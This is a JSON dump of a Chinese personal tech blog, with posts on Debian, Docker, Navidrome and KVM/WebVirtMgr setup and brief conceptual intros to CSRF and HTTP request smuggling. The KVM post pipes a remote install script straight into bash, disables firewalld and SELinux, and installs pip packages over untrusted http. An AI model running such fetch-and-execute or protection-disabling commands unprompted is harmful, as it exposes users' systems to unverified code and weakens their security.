{"meta":{"title":"frozenfish'blog","subtitle":"","description":"","author":"frozenfish","url":"http://example.com","root":"/"},"pages":[{"title":"文章归档","date":"2023-12-01T13:26:05.298Z","updated":"2023-12-01T13:26:05.298Z","comments":true,"path":"archives.html","permalink":"http://example.com/archives.html","excerpt":"","text":""},{"title":"./about/","date":"2023-08-07T16:15:39.000Z","updated":"2023-12-24T07:34:14.909Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"仅用来记录学习进度。和分享技术。友链:www.seebs.net/ 我不知道什么这是谁的博客，主人是一名黑客"},{"title":"./classify/","date":"2023-08-07T16:12:22.000Z","updated":"2023-08-07T16:14:26.769Z","comments":true,"path":"classify/index.html","permalink":"http://example.com/classify/index.html","excerpt":"","text":"编程生活随记"},{"title":"search","date":"2023-12-27T16:06:53.639Z","updated":"2023-12-27T16:06:53.639Z","comments":true,"path":"search/index.html","permalink":"http://example.com/search/index.html","excerpt":"","text":""}],"posts":[{"title":"转debian","slug":"转debian","date":"2024-01-08T14:36:12.000Z","updated":"2024-01-09T08:10:54.085Z","comments":true,"path":"2024/01/08/转debian/","link":"","permalink":"http://example.com/2024/01/08/%E8%BD%ACdebian/","excerpt":"","text":"系统相关12345678910fish@fishserver:~$ lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTSsda 8:0 0 238.5G 0 disk ├─sda1 8:1 0 512M 0 part /boot/efi├─sda2 8:2 0 488M 0 part /boot└─sda3 8:3 0 237.5G 0 part ├─fishserver--vg-root 254:0 0 27.9G 0 lvm / ├─fishserver--vg-swap_1 254:1 0 976M 0 lvm [SWAP] └─fishserver--vg-home 254:2 0 208.6G 0 lvm /home 1i 123目录存放： /music音乐 /nav 数据库工具 没有ifconfig命令12安装包apt install net-tools ifconfig：单网卡12345678910111213141516171819202122232425262728293031323334353637383940414243444546fish@fishserver:~$ /sbin/ifconfig br-031d046d3ebf: flags=4099&lt;UP,BROADCAST,MULTICAST&gt; mtu 1500 inet 172.18.0.1 netmask 255.255.0.0 broadcast 172.18.255.255 ether 02:42:a1:c0:98:79 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 inet6 fe80::42:c0ff:fee6:b1dd prefixlen 64 scopeid 0x20&lt;link&gt; ether 02:42:c0:e6:b1:dd txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5 bytes 526 (526.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0enp1s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.2.17 netmask 255.255.255.0 broadcast 192.168.2.255 inet6 fe80::2e0:b4ff:fe60:cea9 prefixlen 64 scopeid 0x20&lt;link&gt; inet6 2408:827a:3f:dd80:2e0:b4ff:fe60:cea9 prefixlen 64 scopeid 0x0&lt;global&gt; ether 00:e0:b4:60:ce:a9 txqueuelen 1000 (Ethernet) RX packets 244 bytes 36051 (35.2 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 235 bytes 34042 (33.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0veth22eda58: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::c079:72ff:fe92:35f7 prefixlen 64 scopeid 0x20&lt;link&gt; ether c2:79:72:92:35:f7 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 16 bytes 1392 (1.3 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 更换源修改文件 &#x2F;etc&#x2F;apt&#x2F;sources.list 为下面内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# Debian 10 buster# 中科大源deb http://mirrors.ustc.edu.cn/debian buster main contrib non-freedeb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-freedeb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-freedeb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free# 官方源deb http://deb.debian.org/debian buster main contrib non-freedeb http://deb.debian.org/debian buster-updates main contrib non-freedeb http://deb.debian.org/debian-security/ buster/updates main contrib non-freedeb-src http://deb.debian.org/debian buster main contrib non-freedeb-src http://deb.debian.org/debian buster-updates main contrib non-freedeb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free# 网易源deb http://mirrors.163.com/debian/ buster main non-free contribdeb http://mirrors.163.com/debian/ buster-updates main non-free contribdeb http://mirrors.163.com/debian/ buster-backports main non-free contribdeb http://mirrors.163.com/debian-security/ buster/updates main non-free contribdeb-src http://mirrors.163.com/debian/ buster main non-free contribdeb-src http://mirrors.163.com/debian/ buster-updates main non-free contribdeb-src http://mirrors.163.com/debian/ buster-backports main non-free contribdeb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib# 阿里云deb http://mirrors.aliyun.com/debian/ buster main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb http://mirrors.aliyun.com/debian-security buster/updates maindeb-src http://mirrors.aliyun.com/debian/ buster main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian-security buster/updates main 123456789101112131415161718apt install sudoapt install dockervim /etc/docker/daemon.json&#123; &quot;registry-mirrors&quot;: [ &quot;https://7bezldxe.mirror.aliyuncs.com/&quot;, &quot;https://docker.mirrors.ustc.edu.cn/&quot;, &quot;https://hub-mirror.c.163.com&quot;, &quot;https://registry.docker-cn.com&quot; ], &quot;insecure-registries&quot;: [], &quot;debug&quot;: false, &quot;experimental&quot;: false, &quot;features&quot;: &#123; &quot;buildkit&quot;: true &#125;&#125; how to install docker 1https://docs.docker.com/desktop/ 1apt install curl 1curl -fsSL https://get.docker.com -o get-docker.sh 1sudo sh get-docker.sh docker安装navidrome官方的写法：123456789101112131415161718192021222324252627282930version: &quot;3&quot;services: navidrome: image: deluan/navidrome:latest user: 1000:1000 # should be owner of volumes ports: - &quot;4533:4533&quot; restart: unless-stopped environment: # Optional: put your config options customization here. Examples: ND_SCANSCHEDULE: 1h ND_LOGLEVEL: info ND_SESSIONTIMEOUT: 24h ND_BASEURL: &quot;&quot; volumes: - &quot;/path/to/data:/data&quot; - &quot;/path/to/your/music/folder:/music:ro&quot; 其他1； version: &#x27;3.8&#x27; services: navidrome: image: &#x27;deluan/navidrome:latest&#x27; container_name: navidrome restart: unless-stopped network_mode: bridge environment: - ND_SCANNER_EXTRACTOR=ffmpeg PND_ENABLETRANSCODINGCONFIGGID=true - ND_ENABLESHARING=true - ND_SCANSCHEDULE=1h ports: - &#x27;4533:4533&#x27; volumes: - /share/Container/navidrome/data:/data - /share/media2/music:/music 1234567891011121314151617181920212223docker-compose创建包含以下内容的文件（或添加服务 下面到您现有的文件）：docker-compose.ymlnavidrome创建一个docker-compose.yml文件,内容如下：version: &quot;3&quot;services: navidrome: image: deluan/navidrome:latest user: 1000:1000 # should be owner of volumes ports: - &quot;4533:4533&quot; restart: unless-stopped environment: # Optional: put your config options customization here. Examples: ND_SCANSCHEDULE: 1h ND_LOGLEVEL: info ND_SESSIONTIMEOUT: 24h ND_BASEURL: &quot;&quot; volumes: - &quot;/home/fish/navidrome:/data&quot; - &quot;/home/fish/music:/music:ro&quot; 1docker-compose up -d 12345678910111213fish@fishserver:~$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES36f1b4c09f21 deluan/navidrome:latest &quot;/app/navidrome&quot; 10 minutes ago Restarting (1) 34 seconds ago fish_navidrome_1fish@fishserver:~$ sudo docker rm 36f1b4c09f21Error response from daemon: You cannot remove a restarting container 36f1b4c09f21d86076b10c9d7f9659eeff2976c4199e4b3beab2f26112503b0c. Stop the container before attempting removal or force removefish@fishserver:~$ sudo docker rm -f 36f1b4c09f2136f1b4c09f21fish@fishserver:~$ 第二种方式123456789docker run -d \\ --name navidrome \\ --restart=unless-stopped \\ --user $(id -u):$(id -g) \\ -v /home/fish/music:/music:ro \\ -v /home/fish/navidrome:/data \\ -p 4533:4533 \\ -e ND_LOGLEVEL=info \\ deluan/navidrome:latest 12docker run -d -v /home/fish/music:/srv -v /home/fish/filebrowser/filebrowserconfig.json:/etc/config.json -v /home/fish/filebrowser/database.db:/etc/database.db -p 8080:80 filebrowser/filebrowser ddns-go1docker run -d --name ddns-go --restart=always --net=host -v /home/fish/ddns-go:/root jeessy/ddns-go Docker中使用(来自官方文档) 不挂载主机目录, 删除容器同时会删除配置 1234# host模式, 同时支持IPv4/IPv6, Liunx系统推荐docker run -d --name ddns-go --restart=always --net=host jeessy/ddns-go# 桥接模式, 只支持IPv4, Mac/Windows系统推荐docker run -d --name ddns-go --restart=always -p 9876:9876 jeessy/ddns-go 在浏览器中打开http://主机IP:9876，修改你的配置，成功 [可选] 挂载主机目录, 删除容器后配置不会丢失。可替换 /opt/ddns-go 为主机目录, 配置文件为隐藏文件 1docker run -d --name ddns-go --restart=always --net=host -v /opt/ddns-go:/root jeessy/ddns-go [可选] 支持启动带参数 -l监听地址 -f间隔时间(秒) 1docker run -d --name ddns-go --restart=always --net=host jeessy/ddns-go -l :9877","categories":[],"tags":[]},{"title":"kvm虚拟机安装wrt","slug":"kvm虚拟机安装wrt","date":"2024-01-08T08:29:59.000Z","updated":"2024-01-08T11:38:46.041Z","comments":true,"path":"2024/01/08/kvm虚拟机安装wrt/","link":"","permalink":"http://example.com/2024/01/08/kvm%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85wrt/","excerpt":"","text":"最近在折腾服务部署公网的事情1234567本来想着360t7刷成wrt以为能在线涮实际上是要烧录他自带的防火墙挡我的服务却没有关闭的地方。这个就很难受因为一时半会没有办法整一台拥有wrt的硬路由又听虚拟机kvm和vbox。选择kvm虚拟机之前用docker结果夺舍宿主机，。这个我不太了解dockers技术等以后会研究一下他的虚拟化技术！！服务器环境是arch。kvm。docker，ddns，反向代理还有https以后会考虑搞！ 搬运自：archlinux 安装KVM,QEMU - 掰断曲别针 - 博客园 (cnblogs.com) KVM是Linux世界中最常用的虚拟化软件之一。事实上，大多数云提供商都使用KVM作为他们的虚拟机管理程序。包括OpenStack在内的大型项目都使用KVM作为默认虚拟化工具。 以下是如何在Arch Linux和Manjaro上安装KVM、QEMU和Virt Manager的完整指南。 安装KVM包第一步是安装运行KVM所需的所有软件包： 123sudo pacman -Syysudo pacman -S archlinux-keyringsudo pacman -S qemu virt-manager virt-viewer dnsmasq vde2 bridge-utils openbsd-netcat dmidecode 同时安装ebtbles和iptables软件包。 1sudo pacman -S ebtables iptables 安装其他工具libguestfs是一组用于访问和修改虚拟机（VM）磁盘映像的工具。作用如下： 查看和编辑来宾中的文件 编写对虚拟机的更改脚本 监视磁盘使用&#x2F;可用统计信息 创建来宾 P2V （物理机到虚拟机的迁移） V2V （虚拟机到虚拟机的迁移） 执行备份及其他 1sudo pacman -S libguestfs 启动KVM libvirt服务 启用服务并设置开机自启动 12sudo systemctl enable libvirtd.servicesudo systemctl start libvirtd.service 查看运行状态 1systemctl status libvirtd.service 配置普通用户可以使用KVM 打开&#x2F;etc&#x2F;libvirt&#x2F;libvirtd.conf文件进行编辑。 12sudo pacman -S vimsudo vim /etc/libvirt/libvirtd.conf 将UNIX域套接字组所有权设置为libvirt（第85行左右） 1unix_sock_group = &quot;libvirt&quot; 为R&#x2F;W套接字设置UNIX套接字权限（第102行附近） 1unix_sock_rw_perms = &quot;0770&quot; 将当前用户帐户添加到libvirt组 12sudo usermod -a -G libvirt $(whoami)newgrp libvirt 重新启动libvirt守护进程。 1sudo systemctl restart libvirtd.service 启用嵌套虚拟化（可选） 嵌套虚拟化就是在虚拟机中运行虚拟机。如图所示，通过启用内核模块为kvm_intel &#x2F; kvm_amd启用嵌套虚拟化。 一般不会这样搞。 1234567### Intel Processor ###sudo modprobe -r kvm_intelsudo modprobe kvm_intel nested=1### AMD Processor ###sudo modprobe -r kvm_amdsudo modprobe kvm_amd nested=1 要使此配置持久化，请运行： 1echo &quot;options kvm-intel nested=1&quot; | sudo tee /etc/modprobe.d/kvm-intel.conf 确认“嵌套虚拟化”设置为“yes”： 12345678910111213## Intel Processor ###$ systool -m kvm_intel -v | grep nested nested = &quot;Y&quot; nested_early_check = &quot;N&quot;$ cat /sys/module/kvm_intel/parameters/nested Y### AMD Processor ###$ systool -m kvm_amd -v | grep nested nested = &quot;Y&quot; nested_early_check = &quot;N&quot;$ cat /sys/module/kvm_amd/parameters/nested Y kvm介绍转载：KVM的基本使用 - 匿名者nwnu - 博客园 (cnblogs.com) 虚拟化是云计算的基础。简单的说，虚拟化使得在一台物理的服务器上可以跑多台虚拟机，虚拟机共享物理机的 CPU、内存、IO 硬件资源，但逻辑上虚拟机之间是相互隔离的。 物理机我们一般称为宿主机（Host），宿主机上面的虚拟机称为客户机（Guest）。 那么 Host 是如何将自己的硬件资源虚拟化，并提供给 Guest 使用的呢？ 这个主要是通过一个叫做 Hypervisor 的程序实现的。 根据 Hypervisor 的实现方式和所处的位置，虚拟化又分为两种： 全虚拟化- 半虚拟化全虚拟化： Hypervisor 直接安装在物理机上，多个虚拟机在 Hypervisor 上运行。Hypervisor 实现方式一般是一个特殊定制的 Linux 系统。Xen 和 VMWare 的 ESXi 都属于这个类型 半虚拟化： 理论上讲： 全虚拟化一般对硬件虚拟化功能进行了特别优化，性能上比半虚拟化要高； 半虚拟化因为基于普通的操作系统，会比较灵活，比如支持虚拟机嵌套。嵌套意味着可以在KVM虚拟机中再运行KVM。 *2*|***0***2. kvm介绍 kVM 全称是 Kernel-Based Virtual Machine。也就是说 KVM 是基于 Linux 内核实现的。 KVM有一个内核模块叫 kvm.ko，只用于管理虚拟 CPU 和内存。 那 IO 的虚拟化，比如存储和网络设备则是由 Linux 内核与Qemu来实现。 作为一个 Hypervisor，KVM 本身只关注虚拟机调度和内存管理这两个方面。IO 外设的任务交给 Linux 内核和 Qemu。 大家在网上看 KVM 相关文章的时候肯定经常会看到 Libvirt 这个东西。 Libvirt 就是 KVM 的管理工具。 其实，Libvirt 除了能管理 KVM 这种 Hypervisor，还能管理 Xen，VirtualBox 等。 Libvirt 包含 3 个东西：后台 daemon 程序 libvirtd、API 库和命令行工具 virsh libvirtd是服务程序，接收和处理 API 请求； API 库使得其他人可以开发基于 Libvirt 的高级工具，比如 virt-manager，这是个图形化的 KVM 管理工具； virsh 是我们经常要用的 KVM 命令行工具 *3*|***0***3. kvm部署 环境说明： IP：192.168.157.99 *3*|***1***3.1 kvm安装 部署前请确保你的CPU虚拟化功能已开启。分为两种情况： 虚拟机要关机设置CPU虚拟化- 物理机要在BIOS里开启CPU虚拟化&#x2F;&#x2F;关闭防火墙与selinux 12345systemctl stop firewalldsystemctl disable firewalldsetenforce 0sed -ri &#x27;s/^(SELINUX=).*/\\1disabled/g&#x27; /etc/selinux/config//这一步十分重要！！！ &#x2F;&#x2F;配置网络源 1234curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repowget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repoyum makecacheyum -y install epel-release vim wget net-tools unzip zip gcc gcc-c++ &#x2F;&#x2F;验证CPU是否支持KVM；如果结果中有vmx（Intel）或svm(AMD)字样，就说明CPU的支持的 1egrep -o &#x27;vmx|svm&#x27; /proc/cpuinfo &#x2F;&#x2F;安装KVM依赖包及管理工具 12# kvm属于内核态，不需要安装。但是需要一些管理工具包yum install -y qemu-kvm libvirt libvirt-python libguestfs-tools virt-install virt-manager python-virtinst libvirt-client virt-viewer qemu-kvm-tool &#x2F;&#x2F;因为虚拟机中网络，我们一般都是和公司的其他服务器是同一个网段，所以我们需要把 KVM服务器的网卡配置成桥接模式。这样的话KVM的虚拟机就可以通过该桥接网卡和公司内部 其他服务器处于同一网段 &#x2F;&#x2F;此处我的网卡是ens32，所以用br0来桥接ens32网卡 1234567891011121314151617181920212223//对应修改或者添加以下内容即可[root@mp ~]# vim /etc/sysconfig/network-scripts/ifcfg-br0 TYPE=BridgeDEVICE=br0NM_CONTROLLED=noBOOTPROTO=staticNAME=br0ONBOOT=yesIPADDR=192.168.157.99NETMASK=255.255.255.0GATEWAY=192.168.157.2DNS1=8.8.8.8//保留以下内容即可[root@mp ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens32 TYPE=EthernetBOOTPROTO=staticNAME=ens33DEVICE=ens33ONBOOT=yesBRIDGE=br0NM_CONTROLLED=no[root@mp ~]# systemctl restart network &#x2F;&#x2F;启动服务 12systemctl start libvirtdsystemctl enable libvirtd &#x2F;&#x2F;验证安装结果 1234[root@mp ~]# lsmod|grep kvmkvm_intel 170086 0 kvm 566340 1 kvm_intelirqbypass 13503 1 kvm &#x2F;&#x2F;测试并验证安装结果 123456789101112131415[root@mp ~]# virsh -c qemu:///system list Id 名称 状态----------------------------------------------------[root@mp ~]# virsh --version4.5.0[root@mp ~]# virt-install --version1.5.0[root@mp ~]# ln -s /usr/libexec/qemu-kvm /usr/bin/qemu-kvm[root@mp ~]# ll /usr/bin/qemu-kvm lrwxrwxrwx. 1 root root 21 3月 14 14:17 /usr/bin/qemu-kvm -&amp; /usr/libexec/qemu-kvm [root@mp ~]# lsmod |grep kvmkvm_intel 170086 0 kvm 566340 1 kvm_intelirqbypass 13503 1 kvm &#x2F;&#x2F;查看网桥信息 1234[root@mp ~]# brctl showbridge name bridge id STP enabled interfacesbr0 8000.000c2993a66c no ens32virbr0 8000.5254009df26a yes virbr0-nic *3*|***2***3.2 kvm web管理界面安装 kvm 的 web 管理界面是由 webvirtmgr 程序提供的。 &#x2F;&#x2F;安装依赖包 1234# 管理端安装yum -y install git python-pip libvirt-python libxml2-python python-websockify supervisor gcc python-devel# 使用pip安装Python扩展程序库pip install numpy -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com &#x2F;&#x2F;升级pip 1pip install --upgrade pip &#x2F;&#x2F;git克隆配置并运行WebVirMgr 1234567891011121314151617181920212223# 创建data目录，将WebVirtMgr移动到data目录，同时创建KVM存储目录mkdir /data/kvm -pv# 克隆项目cd /datagit clone git://github.com/retspen/webvirtmgr.gitcd webvirtmgrpip install -r requirements.txt -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com# 说明:requirements.txt主要是用于记录所有依赖包及其精确的版本号。以便新环境部署# 初始化环境./manage.py syncdb## 这里需要我们输入Yes，配置管理员用户配置信息如下Would you like to create one now? (yes/no): yes #是否现在创建管理员用户Username (leave blank to use &#x27;root&#x27;): root #用户名称Email address: #邮箱地址 (可以不填)Password: #管理员用户密码Password (again): #重复输入密码Superuser created successfully. #创建成功# 配置Django 静态页面./manage.py collectstatic 输入Yes即可# 如果还想继续添加管理员用户，可以执行下面的命令./manage.py createsuperuser &#x2F;&#x2F;启动WebVirMgr 12前台启动WebVirMgr，默认是Debug模式同时日志打印在前台./manage.py runserver 0:8000 访问:http://192.168.209.134:8000 &#x2F;&#x2F;安装Nginx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748491.安装依赖yum install -y gcc glibc gcc-c++ prce-devel openssl-devel pcre-devel2.安装编译Nginxcd /root/wget http://nginx.org/download/nginx-1.16.1.tar.gzuseradd -s /sbin/nologin nginx -M tar xf nginx-1.16.1.tar.gz &amp;&amp; cd nginx-1.16.1.tar.gz./configure --prefix=/usr/local/nginx-1.16.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_modulemake &amp;&amp; make installln -s /usr/local/nginx-1.16.1 /usr/local/nginx# 修改配置文件cd /usr/local/nginx/confvim nginx.confworker_processes 1;user nginx;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name kvm.i4t.com; location / &#123; proxy_pass http://127.0.0.1:8000; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-for $proxy_add_x_forwarded_for; proxy_set_header Host $host:$server_port; proxy_set_header X-Forwarded-Proto $remote_addr; proxy_connect_timeout 600; proxy_read_timeout 600; proxy_send_timeout 600; client_max_body_size 5120M; &#125; location /static/ &#123; root /data/webvirtmgr; expires max; &#125; &#125;&#125;# 启动Nginx/usr/local/nginx/sbin/nginx -t/usr/local/nginx/sbin/nginx &#x2F;&#x2F;配置nginx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748491.安装依赖yum install -y gcc glibc gcc-c++ prce-devel openssl-devel pcre-devel2.安装编译Nginxcd /root/wget http://nginx.org/download/nginx-1.16.1.tar.gzuseradd -s /sbin/nologin nginx -M tar xf nginx-1.16.1.tar.gz &amp;&amp; cd nginx-1.16.1.tar.gz./configure --prefix=/usr/local/nginx-1.16.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_modulemake &amp;&amp; make installln -s /usr/local/nginx-1.16.1 /usr/local/nginx# 修改配置文件cd /usr/local/nginx/confvim nginx.confworker_processes 1;user nginx;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name kvm.i4t.com; location / &#123; proxy_pass http://127.0.0.1:8000; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-for $proxy_add_x_forwarded_for; proxy_set_header Host $host:$server_port; proxy_set_header X-Forwarded-Proto $remote_addr; proxy_connect_timeout 600; proxy_read_timeout 600; proxy_send_timeout 600; client_max_body_size 5120M; &#125; location /static/ &#123; root /data/webvirtmgr; expires max; &#125; &#125;&#125;# 启动Nginx/usr/local/nginx/sbin/nginx -t/usr/local/nginx/sbin/nginx &#x2F;&#x2F;创建supervisor配置文件 12345678910111213141516171819202122232425262728WebVirtMgr默认使用supervisor进行管理(启动停止服务)cat &gt; /etc/supervisord.d/webvirtmgr.ini &lt;&lt; EOF[program:webvirtmgr]command=/usr/bin/python /data/webvirtmgr/manage.py run_gunicorn -c /data/webvirtmgr/conf/gunicorn.conf.pydirectory=/data/webvirtmgrautostart=trueautorestart=truelogfile=/var/log/supervisor/webvirtmgr.loglog_stderr=trueuser=root[program:webvirtmgr-console]command=/usr/bin/python /data/webvirtmgr/console/webvirtmgr-consoledirectory=/data/webvirtmgrautostart=trueautorestart=truestdout_logfile=/var/log/supervisor/webvirtmgr-console.logredirect_stderr=trueuser=rootEOF# 启动systemctl start supervisord systemctl enable supervisord# 检查supervisorctl status# 重启所以（非执行）supervisorctl restart all &#x2F;&#x2F;重启nginx 1/usr/local/nginx/sbin/nginx -s reload *4*|***0***4. kvm web界面管理 通过ip地址在浏览器上访问kvm，例如我这里就是： 此处的用户为：root 密码为：执行python manage syncdb时设置的超级管理员密码 此处的Label要与下面的FQDN &#x2F; IP一致！ 点击上方的IP地址，不是点击Host：192.168.157.99 3.3.2 kvm存储管理 &#x2F;&#x2F;创建存储 点击New Storage **** 进入存储 点击default 池路径 &#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;images：磁盘镜像ISO文件存储的位置 &#x2F;&#x2F;通过远程连接软件上传ISO镜像文件至存储目录&#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;images&#x2F; 1234[root@mp ~]# cd /var/lib/libvirt/images/[root@mp images]# ll总用量 3963904-rw-r--r-- 1 root root 4059037696 3月 15 03:50 rhel-server-7.4-x86_64-dvd.iso &#x2F;&#x2F;在web界面查看ISO镜像文件是否存在 &#x2F;&#x2F;创建系统安装镜像 &#x2F;&#x2F;添加成功如下图 3.3.3 kvm网络管理 点击New Network 3.3.4 实例管理 实例（虚拟机的创建） &#x2F;&#x2F;虚拟机插入光盘 &#x2F;&#x2F;设置在web上访问虚拟机的密码 &#x2F;&#x2F;启动虚拟机 &#x2F;&#x2F;虚拟机安装 此步骤为虚拟机的安装步骤，不再阐述 *5*|*0**4. 所遇问题**5*|***1***4.1 故障一 第一次通过web访问kvm时可能会一直访问不了，一直转圈，而命令行界面一直报错(too many open files) 123456789永久生效方法： 修改/etc/security/limits.conf，在文件底部添加： * soft nofile 655360 * hard nofile 655360 星号代表全局， soft为软件，hard为硬件，nofile为这里指可打开文件数。 另外，要使limits.conf文件配置生效，必须要确保 pam_limits.so 文件被加入到启动文件中。查看 /etc/pam.d/login 文件中有：session required /lib/security/pam_limits.so *5*|***2***4.2 故障二 web界面配置完成后可能会出现以下错误界面 解决方法是安装novnc并通过novnc_server启动一个vnc 12345678910111213141516[root@mp ~]# ll /etc/rc.locallrwxrwxrwx. 1 root root 13 Aug 6 2018 /etc/rc.local -&amp;gt; rc.d/rc.local[root@mp ~]# ll /etc/rc.d/rc.local-rw-r--r-- 1 root root 513 Mar 11 22:35 /etc/rc.d/rc.local[root@mp ~]# chmod +x /etc/rc.d/rc.local[root@mp ~]# ll /etc/rc.d/rc.local-rwxr-xr-x 1 root root 513 Mar 11 22:35 /etc/rc.d/rc.local[root@mp ~]# vim /etc/rc.d/rc.local......此处省略N行# that this script will be executed during boot.touch /var/lock/subsys/localnohup novnc_server 172.16.12.128:5920 &amp;amp;[root@mp ~]# . /etc/rc.d/rc.local 安装yay aur包管理器1234git clone https://aur.archlinux.org/yay-bin.gitcd yay-binmakepkg -si 通过aur安装12yay -S webvirtmgr-gityaourt -S webvirtmgr-git 如果连接失败1234可以使用wattlk也就是steam++命令如下curl -sSL https://steampp.net/Install/Linux.sh | bash然后在尝试 采用命令行自带的管理进行安装虚拟机1这steam++速度也不是很行 centos debian archlinux牵扯问题：12内核加载等，我不想折腾了。于是选择更换稳定的发行版。用arch做服务器是我今年做过最愚蠢的事情之一了","categories":[],"tags":[]},{"title":"csrf","slug":"csrf","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:47:58.109Z","comments":true,"path":"2023/12/26/csrf/","link":"","permalink":"http://example.com/2023/12/26/csrf/","excerpt":"","text":"csrf[TOC] 简介跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为CSRF，是一种对网站的恶意利用。尽管听起来像XSS，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。 分类资源包含资源包含是在大多数介绍CSRF概念的演示或基础课程中可能看到的类型。这种类型归结为控制HTML标签（例如、、、、等）所包含的资源的攻击者。如果攻击者能够影响URL被加载的话，包含远程资源的任何标签都可以完成攻击。 由于缺少对Cookie的源点检查，如上所述，此攻击不需要XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于GET请求，因为这些是浏览器对资源URL唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的HTTP请求方式。 基于表单通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单; 其包含一个JavaScript片段，强制受害者的浏览器提交。 该表单可以完全由隐藏的元素组成，以致受害者很难发现它。 如果处理cookies不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的cookie登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。 XMLHttpRequestXMLHttpRequest可能是最少看到的方式，由于许多现代Web应用程序依赖XHR，许多应用花费大量的时间来构建和实现这一特定的对策。 基于XHR的CSRF通常由于SOP而以XSS有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR仅限于攻击者托管自己的有效载荷的原始请求。 这种类型的CSRF的攻击有效载荷基本上是一个标准的XHR，攻击者已经找到了一些注入受害者浏览器DOM的方式。 防御 通过CSRF-token或者验证码来检测用户提交 验证 Referer/Content-Type 对于用户修改删除等操作最好都使用POST操作 避免全站通用的Cookie，严格设置Cookie的域","categories":[],"tags":[]},{"title":"http请求走私","slug":"http请求走私","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:48:06.035Z","comments":true,"path":"2023/12/26/http请求走私/","link":"","permalink":"http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","excerpt":"","text":"HTTP 请求走私简介HTTP请求走私是一种干扰网站处理HTTP请求序列方式的技术，最早在 2005 年的一篇 文章 中被提出。 成因请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 Content-Length 和 Transfer-Encoding 标头。 分类 CLTE：前端服务器使用 Content-Length 头，后端服务器使用 Transfer-Encoding 头 TECL：前端服务器使用 Transfer-Encoding 标头，后端服务器使用 Content-Length 标头。 TETE：前端和后端服务器都支持 Transfer-Encoding 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。 